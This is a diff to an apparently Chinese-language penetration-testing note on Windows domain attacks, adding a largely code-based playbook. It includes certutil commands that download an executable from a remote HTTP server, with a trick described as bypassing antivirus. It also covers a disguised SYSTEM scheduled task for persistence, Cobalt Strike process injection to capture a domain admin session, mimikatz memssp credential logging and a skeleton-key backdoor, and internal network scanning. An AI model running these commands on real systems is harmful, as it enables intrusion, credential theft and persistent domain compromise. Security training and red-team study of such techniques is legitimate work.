@@ -158,10 +158,83 @@ wannacry利用ms17-010永恒之蓝攻击445传播病毒
 systeminfo   #看计算机信息、域、补丁
 net time /domain  # 一般域控也做时间服务器，如果有代表在域里
 net config workstation #工作域为域名，如果为WORKGROUP表示未域环境，登陆域表示当前用户是域用户（域名）还是本地用户（本地是计算机名）
-net group “domain controllers” /domain  #在与里面能看到域控名$
-ping 域控名  #能定位IP
 net group “domain admins” /domain #定位域管理员名
 域管：域名/域管理员名
 
+net group “domain controllers” /domain  #在与里面能看到域控名$
+ping 域控名  #能定位IP
+
+net use \\域控名
+net view \\域控名  # 查看域控共享的设备
+dir \\域控名\xxxx  # 查看域控共享的文件
 ```
+
+
+
+进行下载(下载并重名名成nice.exe，&是为了绕过杀软)
+
+```
+certutil & certutil -urlcache -split -f http://172.20.10.4:8000/artifact.exe nice.exe
+加上delete就不会产生缓存文件
+certutil & certutil -urlcache -split -f http://172.20.10.4:8000/artifact.exe nice.exe delete
+查看缓存文件：certutil -urlcache *
+删除缓存文件：certutil -urlcache * delete
+```
+
+定时任务使windows服务器上线,apt持久化
+
+```
+schtasks /create /RL HIGHEST /F /tn "Windows Server Update" /tr "c:\windows\Temp\xxx.exe" /sc DAILY /mo 1 /ST 09:00 /RU SYSTEM
+```
+
+使用cs查看进程,如果有域管使用的进程,,在cs中注入进程让域管上线
+
+```
+beacon> inject 进程号 x64 http-ip
+```
+
+域管状态下与域控简历IPC共享
+
+```
+net use \\IP # 简历IPC连接
+dir \\IP\c$  # 列出c盘共享
+```
+
+cs中能使用端口扫描功能进行内网扫描
+
+```
+portscan 192.168.2.0-192.168.2.254 1-1024,3389 arp 1024
+```
+
+ssp记录登陆当前机器的所以账号密码
+
+```
+beacon> mimikatz privilege::debug
+beacon> mimikatz misc::memssp
+beacon> shell type C:\Windows\System32\mimilsa.log
+有人登陆成功:
+beacon> shell type C:\Windows\System32\mimilsa.log # 查看文件内容
+```
+
+Skeleton Key - 万能密码
+
+```
+beacon> mimikatz privilege::debug
+beacon> mimikatz misc::skeleton
+可以通过:  账号:域名\administrator 密码:mimikatz 连接IPC
+beacon> shell net use \\xxxxx-PDM\c$ /user:"a-xxxxx\administrator" "mimikatz"
+beacon> shell dir \\xxxxx-PDM\c$
+```
+
+nbtscan内网存活扫描,并显示IP，主机名(加入域会域名+主机名)，用户名称和MAC地址
+
+- https://github.com/lifenjoiner/nbtscan/releases/tag/nbtscan-v1.5.2-2394b4
+
+```
+nbtscan -r x.x.x.x/24
+```
+
+
+
+来源:https://xz.aliyun.com/t/9816
 
